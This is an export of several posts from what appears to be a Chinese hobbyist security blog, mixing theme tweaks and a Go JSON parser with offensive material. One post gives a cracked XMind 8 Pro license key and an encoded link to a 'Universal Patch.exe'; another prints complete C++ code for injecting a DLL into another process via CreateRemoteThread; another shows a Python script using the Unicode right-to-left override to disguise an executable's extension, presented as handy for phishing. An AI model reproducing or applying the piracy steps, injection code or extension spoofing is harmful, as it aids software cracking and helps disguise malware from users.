    <title>把博客园自己博客皮肤改了下</title>
    <url>/2017/12/28/cnblogs-theme-acg.html</url>
    <content><![CDATA[<p>具体效果看<a href="http://akkuman.cnblogs.com/" target="_blank" rel="noopener">我博客园</a>，或者看<a href="http://www.cnblogs.com/frantic1048/" target="_blank" rel="noopener">原作者frantic1048博客</a></p>
<a id="more"></a>
<h2 id="出处"><a href="#出处" class="headerlink" title="出处"></a>出处</h2><p><a href="https://group.cnblogs.com/topic/71186.html" target="_blank" rel="noopener">折腾了一个新皮肤，自带预览图</a><br>这个皮肤使用博主已经说的比较清楚了，我再发一遍是因为这个主题在手机上emmmm…比较惨不忍睹，自己小小的优化了一下（其实就是隐藏加margin-right哈哈），让手机端可以正常显示了，另外侧边栏有些h3标题无效果，也改进了一下，本人也没专门学过css，只是小修了一下，还是希望大家共同努力，毕竟frantic1048博主提供的这个皮肤真的挺好看</p>
<h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><p>主题选择<code>Gertrude Blue</code>，<code>禁用模板默认CSS</code>勾选上，然后把地址<a href="http://www.cnblogs.com/blog/customcss/359968.css" target="_blank" rel="noopener">http://www.cnblogs.com/blog/customcss/359968.css</a>中的css全部复制到<code>页面定制CSS代码</code>，头像自定义在css文件的239行，可以自行更换地址  </p>
<p><code>博客侧边栏公告</code>里面是<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"sidebar-cus"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"cus-avatar"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p> 如果想要使用页首，遵循下面的结构，其中第二个 span 标签是可选的:<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;div id=&quot;top-qoute-container&quot;&gt;</span><br><span class="line">    &lt;span id=&quot;top-qoute-context&quot;&gt;It is the path you have chosen. Take pride in it.&lt;/span&gt;</span><br><span class="line">    &lt;span id=&quot;top-qoute-from&quot;&gt;Kotomine Kirei&lt;/span&gt;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure></p>
<p>你也可以自定义一个名言列表进行轮换，不过那个需要js权限</p>
<p>其实和frantic1048说明一样，只是css改动了一点</p>
<p>祝大家使用愉快</p>
<h2 id="参考资料："><a href="#参考资料：" class="headerlink" title="参考资料："></a>参考资料：</h2><ul>
<li><a href="https://group.cnblogs.com/topic/71186.html" target="_blank" rel="noopener">折腾了一个新皮肤，自带预览图</a></li>
<li><a href="http://www.cnblogs.com/frantic1048/" target="_blank" rel="noopener">frantic1048的博客</a></li>
</ul>
]]></content>
      <categories>
        <category>theme</category>
      </categories>
      <tags>
        <tag>life</tag>
        <tag>theme</tag>
      </tags>
  </entry>
  <entry>
    <title>湖北掌大协议于2017-12-24入土</title>
    <url>/2017/12/24/Hubei-Exin-portal-was-dead.html</url>
    <content><![CDATA[<p><strong>又好了，，，，能用就行，不管了</strong></p>
<p>湖北e信的掌大协议死过很多次，不过是因为有人盯上了老陈，潜伏在了他的群，自己搞搞其实还是能用  </p>
<p>今天却是死的不能再死，不知是不是永久，谨以此文纪念一下  </p>
<a id="more"></a>
<p>之前便是有人说马上掌大协议就失效了，但我对于这些传说，竟至于颇为怀疑。  </p>
<p>我向来是不惮以最坏的恶意，来推测搞e信的那帮人的，然而我还不料，也不信竟会下劣凶残到这地步。况且始终可以无限时长的可使用路由器的掌大协议，更何至于无端就要失效呢？  </p>
<p>然而今日证明是事实了，今早我起床就发现我自己的脚本登陆不上了，看了下错误输出，<a href="http://58.53.196.165:8080" target="_blank" rel="noopener">58.53.196.165:8080</a>打不开了，只有当你登陆e信后才能打开  </p>
<p>可是我实在无话可说。我只觉得所住的并非人间。又回到了限时的e信，使我艰于呼吸视听，那里还能有什么言语？长歌当哭，是必须在痛定之后的。我已经出离愤怒了。我将e信这非人间的浓黑的悲凉；以我的最大哀痛显示于非人间，使它们快意于我的苦痛，就将这作为后死者的菲薄的祭品，奉献于逝者的灵前。  </p>
<p>总之，在我的记忆上，这次可能就是永别了。</p>
]]></content>
      <categories>
        <category>life</category>
      </categories>
      <tags>
        <tag>life</tag>
      </tags>
  </entry>
  <entry>
    <title>XMind8 Pro版激活序列码与补丁</title>
    <url>/2017/12/22/Xmind-Patch-Crack.html</url>
    <content><![CDATA[<p>//通用许可证密钥//</p>
<p>XMind Pro 2013~XMind Pro 8：<br><a id="more"></a><br><a href="gnrsu@appnee.com">电子邮件地址</a><br><a href="XAka34A2rVRYJ4XBIU35UZMUEEF64CMMIYZCK2FZZUQNODEKUHGJLFMSLIQMQUCUBXRENLK6NZL37JXP4PZXQFILMQ2RG5R7G4QNDO3PSOEUBOCDRYSSXZGRARV6MGA33TN2AMUBHEL4FXMWYTTJDEINJXUAV4BAYKBDCZQWVF3LWYXSDCXY546U3NBGOI3ZPAP2SO3CSQFNB7VVIY123456789012345">许可证密钥</a></p>
<p>//安装说明//</p>
<p>对于XMind 8/8 Update 1/2/3/4/5/6：</p>
<ol>
<li>从官方网站下载并安装XMind 8</li>
<li>现在不要启动它</li>
<li>将“Universal Patch.exe”复制到程序目录，并以管理员身份运行</li>
<li>启动XMind 8，输入“ 帮助/许可证… /输入许可证 ”</li>
<li>使用上面的许可证密钥进行注册</li>
<li>OK</li>
</ol>
<p><img src="https://raw.githubusercontent.com/akkuman/pic/master/img/c0264382gy1fmpnqbummcj20ep0a5aam.jpg" alt=""></p>
<p>聪明的会知道:<a href="aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xdTVLR3pkbldqMWNzbGtwNkxoYmFhV1JiUDZXQTlqTVEvdmlldz91c3A9c2hhcmluZw==">Universal Patch.exe</a></p>
]]></content>
      <categories>
        <category>life</category>
      </categories>
      <tags>
        <tag>life</tag>
      </tags>
  </entry>
  <entry>
    <title>e信与酸酸结合开wifi使用路由器上网</title>
    <url>/2017/11/12/exin-ssserver.html</url>
    <content><![CDATA[<p>关于e信“正常情况下”使用路由器网上是有方法的，入户线插上lan，电脑接lan拨号<br>我想要说的是连接e信后使用路由器上网，并且是绝对正常的思维<br><a id="more"></a><br>手机也是可以连接上wifi，但是手机上连接wifi后的ip地址不是我们的路由器分配和路由器网关，我们改掉，使手机与电脑处于同一网关<br>然后电脑开ssserver（这玩意是什么不用我多说，其实你也可以电脑搭建http proxy server（比如使用cow），然后手机连接wifi设置直接通过代理，但是对于纯tcp和udp就无能为力了）<br>手机连接电脑ssserver，可以上网了，通过开debug模式可以发现走的是电脑ssserver上网<br>具体的小白详细教程做法看心情和时间吧</p>
]]></content>
      <categories>
        <category>life</category>
      </categories>
      <tags>
        <tag>life</tag>
      </tags>
  </entry>
  <entry>
    <title>golang解析json配置文件</title>
    <url>/2017/10/25/golang%E8%A7%A3%E6%9E%90json%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6.html</url>
    <content><![CDATA[<p>突然想起来自己以前写的，golang写的一个简易的json解析器，分享一下</p>
<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><figure class="highlight golang"><table><tr><td class="code"><pre><span class="line"><span class="keyword">go</span> get github.com/akkuman/parseConfig</span><br></pre></td></tr></table></figure>
<h2 id="使用说明"><a href="#使用说明" class="headerlink" title="使用说明"></a>使用说明</h2><a id="more"></a>
<h3 id="环境假设"><a href="#环境假设" class="headerlink" title="环境假设"></a>环境假设</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.</span><br><span class="line">├── config.go</span><br><span class="line">├── config.json</span><br></pre></td></tr></table></figure>
<p>config.json内容  </p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"name"</span> : <span class="string">"akkuman"</span>,</span><br><span class="line">    <span class="attr">"urls"</span> : [<span class="string">"xx.com"</span>,<span class="string">"ww.com"</span>],</span><br><span class="line">    <span class="attr">"info"</span> : &#123;</span><br><span class="line">        <span class="attr">"qq"</span> : <span class="string">"123456"</span>,</span><br><span class="line">        <span class="attr">"weixin"</span>: <span class="string">"123456"</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>该库取出来的都是类型为interface{}的数据，如需取出具体类型的数据需要自己加断言</p>
<p>当取嵌套map数据的时候，以“ &gt; ”指定下一级，注意&gt;两边均有空格，具体见下面的例子</p>
<h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><p>config.go内容</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">package main</span><br><span class="line"></span><br><span class="line">import (</span><br><span class="line">    &quot;github.com/akkuman/parseConfig&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">func main() &#123;</span><br><span class="line">    var config = parseConfig.New(&quot;config.json&quot;)</span><br><span class="line">    // 此为interface&#123;&#125;格式数据</span><br><span class="line">    var name = config.Get(&quot;name&quot;)</span><br><span class="line">    // 断言</span><br><span class="line">    var nameString = name.(string)</span><br><span class="line">    </span><br><span class="line">    // 取数组</span><br><span class="line">    var urls = config.Get(&quot;urls&quot;).([]interface&#123;&#125;)</span><br><span class="line">    var urlsString []string</span><br><span class="line">    for _,v := range urls &#123;</span><br><span class="line">        urlsString = append(urlsString, v.(string))</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    // 取嵌套map内数据</span><br><span class="line">    var qq = config.Get(&quot;info &gt; qq&quot;).(&quot;string&quot;)</span><br><span class="line">    var weixin = config.Get(&quot;info &gt; weixin&quot;).(&quot;string&quot;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Golang</category>
      </categories>
      <tags>
        <tag>Golang</tag>
      </tags>
  </entry>
  <entry>
    <title>dll注入到指定进程</title>
    <url>/2017/10/24/dll%E6%B3%A8%E5%85%A5%E5%88%B0%E6%8C%87%E5%AE%9A%E8%BF%9B%E7%A8%8B.html</url>
    <content><![CDATA[<p>talk is cheap,show me code<br>代码有详细注释，文章底部提示了一些坑<br><a id="more"></a></p>
<h2 id="主程序"><a href="#主程序" class="headerlink" title="主程序"></a>主程序</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stdafx.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;tlhelp32.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;tchar.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">EnableDebugPriv</span><span class="params">(<span class="keyword">char</span>* name)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	HANDLE hToken;</span><br><span class="line">	TOKEN_PRIVILEGES tp;</span><br><span class="line">	LUID luid;</span><br><span class="line">	<span class="comment">//打开进程令牌环</span></span><br><span class="line">	OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &amp;hToken);</span><br><span class="line">	<span class="comment">//获得进程本地唯一ID</span></span><br><span class="line">	LookupPrivilegeValue(<span class="literal">NULL</span>, name, &amp;luid);</span><br><span class="line"></span><br><span class="line">	tp.PrivilegeCount = <span class="number">1</span>;</span><br><span class="line">	tp.Privileges[<span class="number">0</span>].Attributes = SE_PRIVILEGE_ENABLED;</span><br><span class="line">	tp.Privileges[<span class="number">0</span>].Luid = luid;</span><br><span class="line">	<span class="comment">//调整权限</span></span><br><span class="line">	AdjustTokenPrivileges(hToken, <span class="number">0</span>, &amp;tp, <span class="keyword">sizeof</span>(TOKEN_PRIVILEGES), <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//*****************************************************************************************************************************</span></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">InjectDll</span><span class="params">(LPCSTR DllFullPath, <span class="keyword">const</span> DWORD dwRemoteProcessId)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">// 提升权限(必须管理员身份)</span></span><br><span class="line">	EnableDebugPriv(SE_DEBUG_NAME);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//打开远程线程</span></span><br><span class="line">	HANDLE hRemoteProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwRemoteProcessId);</span><br><span class="line">	<span class="keyword">if</span> (hRemoteProcess == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">"Error: OpenProcess failed!\n"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//使用VirtualAllocEx函数在远程进程的内存地址空间分配DLL文件名空间</span></span><br><span class="line">	LPVOID pszLibFileRemote = VirtualAllocEx(hRemoteProcess, <span class="literal">NULL</span>, lstrlen(DllFullPath) + <span class="number">1</span>, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line">	<span class="keyword">if</span> (pszLibFileRemote == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		CloseHandle(hRemoteProcess);</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">"Error: VirtualAllocEx failed!\n"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//使用WriteProcessMemory函数将DLL的路径名写入到远程进程的内存空间</span></span><br><span class="line">	<span class="keyword">if</span> (!WriteProcessMemory(hRemoteProcess, pszLibFileRemote, DllFullPath, lstrlen(DllFullPath) + <span class="number">1</span>, <span class="literal">NULL</span>))</span><br><span class="line">	&#123;</span><br><span class="line">		CloseHandle(hRemoteProcess);</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">"Error: WriteProcessMemory failed!\n"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//启动远程线程LoadLibraryA，通过远程线程调用创建新的线程</span></span><br><span class="line">	HANDLE hRemoteThread;</span><br><span class="line">	<span class="keyword">if</span> ((hRemoteThread = CreateRemoteThread(hRemoteProcess, <span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)LoadLibraryA, pszLibFileRemote, <span class="number">0</span>, <span class="literal">NULL</span>)) == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		CloseHandle(hRemoteProcess);</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">"Error: the remote thread could not be created.\n"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">// 等待线程退出 要设置超时 以免远程线程挂起导致程序无响应</span></span><br><span class="line">		<span class="comment">//WaitForSingleObject(hRemoteThread, 10000);</span></span><br><span class="line">		<span class="comment">// 如果等待线程 DLL中的DllMain不要写MessageBox</span></span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">"Success: the remote thread was successfully created.\n"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 释放句柄</span></span><br><span class="line">	CloseHandle(hRemoteProcess);</span><br><span class="line">	CloseHandle(hRemoteThread);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 根据进程名称获取进程ID</span></span><br><span class="line"><span class="function">DWORD <span class="title">FindTarget</span><span class="params">(LPCSTR lpszProcess)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	DWORD dwRet = <span class="number">0</span>;</span><br><span class="line">	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, <span class="number">0</span>);</span><br><span class="line">	PROCESSENTRY32 pe32;</span><br><span class="line">	pe32.dwSize = <span class="keyword">sizeof</span>(PROCESSENTRY32 );</span><br><span class="line">	Process32First(hSnapshot, &amp;pe32 );</span><br><span class="line">	<span class="keyword">do</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (lstrcmpi(pe32.szExeFile, lpszProcess) == <span class="number">0</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			dwRet = pe32.th32ProcessID;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125; </span><br><span class="line">	&#125; <span class="keyword">while</span> (Process32Next(hSnapshot, &amp;pe32));</span><br><span class="line">	CloseHandle(hSnapshot);</span><br><span class="line">	<span class="keyword">return</span> dwRet; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//*****************************************************************************************************************************</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">	DWORD id = FindTarget((LPCSTR)<span class="string">"calc.exe"</span>);</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; id &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 获取可执行文件所在目录</span></span><br><span class="line">	TCHAR szFilePath[MAX_PATH + <span class="number">1</span>];</span><br><span class="line">	GetModuleFileName(<span class="literal">NULL</span>, szFilePath, MAX_PATH);</span><br><span class="line">	*(_tcsrchr(szFilePath, <span class="string">'\\'</span>)) = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	_tcscat_s(szFilePath, <span class="keyword">sizeof</span>(szFilePath), <span class="string">"\\dll.dll"</span>);</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; szFilePath &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">	InjectDll(szFilePath, id);<span class="comment">//这个数字是你想注入的进程的ID号</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="dllmain"><a href="#dllmain" class="headerlink" title="dllmain"></a>dllmain</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// dllmain.cpp : 定义 DLL 应用程序的入口点。</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stdafx.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">(HINSTANCE hInst     <span class="comment">/* Library instance handle. */</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">	DWORD reason        <span class="comment">/* Reason this function is being called. */</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">	LPVOID reserved     <span class="comment">/* Not used. */</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">switch</span> (reason)</span><br><span class="line">	&#123;</span><br><span class="line">	<span class="keyword">case</span> DLL_PROCESS_ATTACH: <span class="comment">//当这个DLL被映射到了进程的地址空间时</span></span><br><span class="line">		MessageBox(<span class="number">0</span>, TEXT(<span class="string">"From DLL\n"</span>), TEXT(<span class="string">"Process Attach"</span>), MB_ICONINFORMATION);</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">"Process Attach"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">case</span> DLL_PROCESS_DETACH: <span class="comment">//这个DLL从进程的地址空间中解除映射</span></span><br><span class="line">		MessageBox(<span class="number">0</span>, TEXT(<span class="string">"From DLL\n"</span>), TEXT(<span class="string">"Process Detach"</span>), MB_ICONINFORMATION);</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">"Process Detach"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">case</span> DLL_THREAD_ATTACH: <span class="comment">//一个线程正在被创建</span></span><br><span class="line">		MessageBox(<span class="number">0</span>, TEXT(<span class="string">"From DLL\n"</span>), TEXT(<span class="string">"Thread Attach"</span>), MB_ICONINFORMATION);</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">"Thread Attach"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">case</span> DLL_THREAD_DETACH: <span class="comment">//线程终结</span></span><br><span class="line">		MessageBox(<span class="number">0</span>, TEXT(<span class="string">"From DLL\n"</span>), TEXT(<span class="string">"Thread Detach"</span>), MB_ICONINFORMATION);</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">"Thread Detach"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="需要注意的地方"><a href="#需要注意的地方" class="headerlink" title="需要注意的地方"></a>需要注意的地方</h2><ol>
<li>环境是vs，字符集是多字节</li>
<li>这份代码中的<code>hRemoteThread = CreateRemoteThread(hRemoteProcess, NULL, 0, (LPTHREAD_START_ROUTINE)LoadLibraryA, pszLibFileRemote, 0, NULL)</code>中的也可采用GetProcAddress函数  </li>
<li>这份代码并不是通用注入代码（如果需要通用需要自行解析pe头结构从中取出kernel32.dll的GetProcAddress地址）,所以64位windows上需要把vs设置为编译x64</li>
</ol>
]]></content>
      <categories>
        <category>逆向</category>
      </categories>
      <tags>
        <tag>逆向</tag>
      </tags>
  </entry>
  <entry>
    <title>从右向左覆盖实现恶意软件扩展名欺骗</title>
    <url>/2017/10/24/%E4%BB%8E%E5%8F%B3%E5%90%91%E5%B7%A6%E8%A6%86%E7%9B%96%E5%AE%9E%E7%8E%B0%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6%E6%89%A9%E5%B1%95%E5%90%8D%E6%AC%BA%E9%AA%97.html</url>
    <content><![CDATA[<p>这个技术虽然老掉牙，但在网络钓鱼中非常好用<br><a id="more"></a></p>
<h2 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.py</span><br><span class="line">rc_srceen.exe</span><br></pre></td></tr></table></figure>
<h2 id="py文件内容"><a href="#py文件内容" class="headerlink" title="py文件内容"></a>py文件内容</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">name = <span class="string">"\u202Excod.exe"</span></span><br><span class="line">os.rename(os.path.join(os.getcwd(),<span class="string">'re_screen.exe'</span>),os.path.join(os.getcwd(),<span class="string">"re_screen"</span>+name))</span><br></pre></td></tr></table></figure>
<h2 id="执行后"><a href="#执行后" class="headerlink" title="执行后"></a>执行后</h2><p><img src="http://images2017.cnblogs.com/blog/1106918/201710/1106918-20171024180520926-960725164.png" alt=""></p>
<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>Unicode包含若干个特殊字符串，允许在正常情况下从左到右的文本中插入从右到左的文字.其中一个右到左覆写字符串就是“U+202E”<br>详见<a href="http://toutiao.secjia.com/right-to-left-override" target="_blank" rel="noopener">千万小心从右向左覆盖技术 恶意软件经常用这个方法骗用户</a></p>
]]></content>
      <categories>
        <category>Hacker</category>
      </categories>
      <tags>
        <tag>Hacker</tag>
      </tags>
  </entry>
  <entry>
    <title>静态博客阅读次数与评论解决方案</title>
    <url>/2017/10/23/%E9%9D%99%E6%80%81%E5%8D%9A%E5%AE%A2%E9%98%85%E8%AF%BB%E6%AC%A1%E6%95%B0%E4%B8%8E%E8%AF%84%E8%AE%BA%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88.html</url>
    <content><![CDATA[<p>基于LeanCloud的文章阅读次数统计插件<br><a href="https://github.com/Weic96/LeanStatistics.js" target="_blank" rel="noopener">https://github.com/Weic96/LeanStatistics.js</a></p>
<p>基于LeanCloud的文章评论<br><a href="https://github.com/xCss/Valine" target="_blank" rel="noopener">https://github.com/xCss/Valine</a></p>
]]></content>
      <categories>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>Tuts4you注册问题解码</title>
    <url>/2017/09/24/Tuts4you-register.html</url>
    <content><![CDATA[<p>只说一个，是八进制,下面是解码脚本<br>环境python3<br><a id="more"></a></p>
<p><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=28785327&auto=1&height=66"></iframe><br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*-coding:utf-8-*-</span></span><br><span class="line"><span class="comment"># Author: Akkuman</span></span><br><span class="line"><span class="comment"># Blog: hacktech.cn</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Tust4You的问题是八进制,所以八进制转ascii即可</span></span><br><span class="line"><span class="comment"># 解码问题</span></span><br><span class="line">print(<span class="string">"Please input the code what you see on register's page of Tust 4 You:"</span>)</span><br><span class="line">encode_code = input()</span><br><span class="line">encode_list = encode_code.split()</span><br><span class="line">print(<span class="string">"\nthe question is\n"</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> encode_list:</span><br><span class="line">	i = int(i,<span class="number">8</span>)</span><br><span class="line">	print(chr(i), end=<span class="string">""</span>)</span><br></pre></td></tr></table></figure></p>
]]></content>
      <categories>
        <category>逆向</category>
      </categories>
      <tags>
        <tag>逆向</tag>
      </tags>
  </entry>
  <entry>
    <title>一个查表置换的CM</title>
    <url>/2017/09/20/%E4%B8%80%E4%B8%AA%E6%9F%A5%E8%A1%A8%E7%BD%AE%E6%8D%A2%E7%9A%84CM.html</url>
    <content><![CDATA[<p>说实话，今天被自己蠢哭了  </p>
<p>因为看多了一个字符，以为是输入字符变形后的base64编码，也怪自己没大致看过base64汇编形式，把base64跟完了用py实现完算法才意思到是base64，这是题外话<br><a id="more"></a><br>本人初学者，两天或一天一个cm练练，大家可以与我交流<a href="mailto:akkumans@qq.com" target="_blank" rel="noopener">akkumans@qq.com</a>，<a href="http://hacktech.cn">我博客</a>  </p>
<p>上面的题外话就是今天搞的一个cm，被自己蠢哭了，不过也算是base64编码流程无比清晰了，不算是无用功  </p>
<p>这个cm是一个控制台的，丢到xp无法运行，本机只装了x64dbg(x32dbg)，用这个调试软件来试试吧<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\Users\Administrator\Desktop&gt;reverse3.exe</span><br><span class="line">Please enter the flag:97103012</span><br><span class="line">wrong input</span><br></pre></td></tr></table></figure></p>
<p>字符串搜索，找到判断的地方<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">01241269 | 85 C0                    | test eax,eax                             | zf=1 =&gt; eax=0</span><br><span class="line">0124126B | 75 07                    | jne reverse3.1241274                     |</span><br><span class="line">0124126D | 68 78 21 24 01           | push reverse3.1242178                    | 1242178:&quot;this is the right flag&quot;</span><br><span class="line">01241272 | EB 05                    | jmp reverse3.1241279                     |</span><br><span class="line">01241274 | 68 90 21 24 01           | push reverse3.1242190                    | 1242190:&quot;wrong input&quot;</span><br><span class="line">01241279 | FF 15 B0 20 24 01        | call dword ptr ds:[&lt;&amp;puts&gt;]              |</span><br><span class="line">0124127F | 8B 4D FC                 | mov ecx,dword ptr ss:[ebp-4]             |</span><br><span class="line">01241282 | 83 C4 04                 | add esp,4                                |</span><br><span class="line">01241285 | 33 CD                    | xor ecx,ebp                              |</span><br><span class="line">01241287 | 33 C0                    | xor eax,eax                              | eax:&quot;OTacMDMzMTI=&quot;</span><br><span class="line">01241289 | E8 92 00 00 00           | call reverse3.1241320                    |</span><br><span class="line">0124128E | 8B E5                    | mov esp,ebp                              |</span><br><span class="line">01241290 | 5D                       | pop ebp                                  |</span><br><span class="line">01241291 | C3                       | ret                                      |</span><br></pre></td></tr></table></figure></p>
